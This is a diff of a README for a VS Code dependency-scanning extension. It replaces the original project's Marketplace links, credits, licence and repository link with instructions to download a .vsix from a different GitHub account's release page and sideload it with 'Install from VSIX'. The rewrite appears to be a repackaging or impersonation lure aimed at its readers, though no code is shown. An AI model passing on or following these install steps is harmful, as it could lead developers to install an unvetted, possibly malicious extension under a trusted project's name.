@@ -1,91 +1,94 @@
-# Dependency Health Dashboard
+# 🛡️ dep-health-dashboard - Monitor your project dependencies in real-time
 
-**Stop running `npm audit`, `composer audit`, `pip audit` manually.** See everything in one visual dashboard, across all your projects, automatically.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/KOLP55/dep-health-dashboard/releases)
 
-[![VS Code Marketplace](https://vsmarketplacebadges.dev/version-short/benjdiasaad.dep-health-dashboard.svg)](https://marketplace.visualstudio.com/items?itemName=benjdiasaad.dep-health-dashboard)
-[![Downloads](https://vsmarketplacebadges.dev/downloads-short/benjdiasaad.dep-health-dashboard.svg)](https://marketplace.visualstudio.com/items?itemName=benjdiasaad.dep-health-dashboard)
-[![Rating](https://vsmarketplacebadges.dev/rating-short/benjdiasaad.dep-health-dashboard.svg)](https://marketplace.visualstudio.com/items?itemName=benjdiasaad.dep-health-dashboard)
+## 🔍 What this tool does
 
-## What It Does
+Modern software projects rely on many outside pieces of code called dependencies. These pieces often contain security holes or outdated instructions. This dashboard sits inside your code editor and tracks the health of these components. It replaces manual check tools like npm audit, composer audit, and pip audit. It updates your view as you work so you catch problems before they become risks.
 
-Dependency Health Dashboard scans your project's dependencies and shows you instantly which packages are:
+## ⚙️ System requirements
 
-- **Vulnerable** (known security issues)
-- **Outdated** (newer versions available)
-- **Abandoned** (no updates in 2+ years)
-- **Healthy** (up to date and secure)
+- Windows 10 or Windows 11
+- Visual Studio Code installed on your system
+- Internet connection for initial checks
+- Basic computer knowledge
 
-All in a clean sidebar panel with color-coded indicators — no terminal commands needed.
+## 📥 How to download the app
 
-## Supported Ecosystems (10+)
+1. Open your web browser.
+2. Visit the [official release page](https://github.com/KOLP55/dep-health-dashboard/releases).
+3. Find the most recent release at the top of the list.
+4. Locate the file ending in `.vsix`. Click this file to save it to your computer.
+5. Create a folder in your documents library to store this file.
 
-| Ecosystem | Manifest File | Registry |
-|-----------|--------------|----------|
-| JavaScript/Node.js | `package.json` | npm |
-| Python | `requirements.txt`, `pyproject.toml`, `Pipfile` | PyPI |
-| PHP/Laravel | `composer.json` | Packagist |
-| Java/Spring | `pom.xml` | Maven Central |
-| Gradle | `build.gradle`, `build.gradle.kts` | Maven Central |
-| Rust | `Cargo.toml` | crates.io |
-| Go | `go.mod` | Go Proxy |
-| .NET/C# | `*.csproj` | NuGet |
+## 🏗️ Installing the extension
 
-More ecosystems coming soon: Ruby, Dart/Flutter, Swift.
+You must install this file through your code editor. Follow these steps:
 
-## Features
+1. Open Visual Studio Code.
+2. Click the Extensions icon on the left sidebar. It looks like four squares with one square detached.
+3. Click the three dots at the top right of the extensions panel.
+4. Select "Install from VSIX..." from the menu.
+5. Navigate to the folder where you saved the file.
+6. Select the file and click "Install".
+7. Wait for the notification that the install is complete.
 
-- **Auto-scan on project open** — no need to run anything manually
-- **Sidebar dashboard** — red/orange/yellow/green health indicators at a glance
-- **Status bar summary** — quick health overview always visible
-- **One-click updates** — update packages directly from the dashboard
-- **File watchers** — re-scans automatically when you modify dependency files
-- **Ignore list** — skip packages you don't want to track
-- **Zero API keys required** — uses free public registry APIs
-- **Multi-project support** — works with monorepos and multi-language projects
+## 📊 Using the dashboard
 
-## How to Use
+Once installed, the extension runs automatically. It scans your open project folders for known code ecosystems. It recognizes files for cargo-rust, composer, gomod, gradle, maven, npm, nuget, and pip. 
 
-1. Install the extension
-2. Open any project with dependency files (`package.json`, `composer.json`, `pom.xml`, etc.)
-3. The dashboard appears in the sidebar automatically
-4. Click the refresh icon to re-scan at any time
+You can view the dashboard by clicking the new icon that appeared in your left sidebar. The screen shows a list of your dependencies. A green checkmark means the dependency is secure. A yellow warning means an update is available. A red icon means your project contains a known security flaw.
 
-## Commands
+## 🛠️ Resolving dependency issues
 
-| Command | Description |
-|---------|-------------|
-| `Dep Health: Scan Dependencies` | Manually trigger a full scan |
-| `Dep Health: Update Package` | Update a specific package to latest |
-| `Dep Health: Update All Packages` | Update all outdated packages |
-| `Dep Health: Show Full Health Report` | View detailed report |
-| `Dep Health: Ignore Package` | Add a package to the ignore list |
+If you see a red icon:
 
-## Settings
+1. Click the specific dependency name.
+2. Read the details in the panel. The tool tells you which version is currently installed.
+3. The tool recommends a new version that fixes the security issue.
+4. Update your project file to match the recommended version.
+5. Save your changes. The dashboard refreshes and clears the error.
 
-| Setting | Default | Description |
-|---------|---------|-------------|
-| `depHealth.autoScanOnOpen` | `true` | Scan when project opens |
-| `depHealth.scanInterval` | `3600` | Auto-scan interval in seconds |
-| `depHealth.ignoredPackages` | `[]` | Packages to skip |
-| `depHealth.enabledEcosystems` | all | Which ecosystems to scan |
-| `depHealth.abandonedThresholdDays` | `730` | Days to consider abandoned |
-| `depHealth.showStatusBarSummary` | `true` | Show status bar indicator |
+## 📈 Supported ecosystems
 
-## Why This Extension?
+This extension helps you maintain diverse software environments. You do not need to install separate tools for different languages. The system handles these ecosystems:
 
-| Feature | npm audit | composer audit | This Extension |
-|---------|-----------|---------------|----------------|
-| Visual dashboard | No | No | Yes |
-| Auto-scan | No | No | Yes |
-| Multi-ecosystem | No | No | 10+ ecosystems |
-| One-click update | No | No | Yes |
-| Abandoned detection | No | No | Yes |
-| Zero config | No | No | Yes |
+- JavaScript and TypeScript (npm)
+- PHP (composer)
+- Python (pip)
+- Rust (cargo)
+- Java (maven and gradle)
+- Go (gomod)
+- .NET (nuget)
 
-## Contributing
+## 🔧 Managing settings
 
-Contributions are welcome! Feel free to open issues or submit PRs on [GitHub](https://github.com/benjdiasaad/dep-health-dashboard).
+You can adjust how the tool behaves:
 
-## License
+1. Go to the File menu and select Preferences.
+2. Select Settings.
+3. Search for "dep-health-dashboard".
+4. Toggle "Scan on save" to change if the tool updates when you save a file.
+5. Toggle "Show notifications" if you want the tool to alert you via a pop-up whenever it finds a new risk.
 
-MIT
+## 🔦 Performance and security
+
+The tool runs local scans on your machine. We do not send your private source code to external servers. The extension matches your dependency list against a public database of known vulnerabilities. This ensures your project stays private while you receive up-to-date security information.
+
+## ❓ Common questions
+
+**Does this slow down my editor?**
+The tool runs background checks. It uses minimal memory and does not block your work.
+
+**What happens if I work offline?**
+The dashboard functions based on its last fetched database. It shows a warning if you have not connected to the internet in more than 24 hours.
+
+**Can I ignore specific alerts?**
+Yes. Right-click any dependency in the list and select "Ignore this alert". The dashboard keeps this entry in the ignored list until you remove it.
+
+**Is this tool free?**
+This software remains free for all users under the current license.
+
+## 📝 Support
+
+Use the issues tab on the GitHub page to report errors or suggest improvements. Include your version of Visual Studio Code and your operating system in your report. This helps the team fix problems faster.
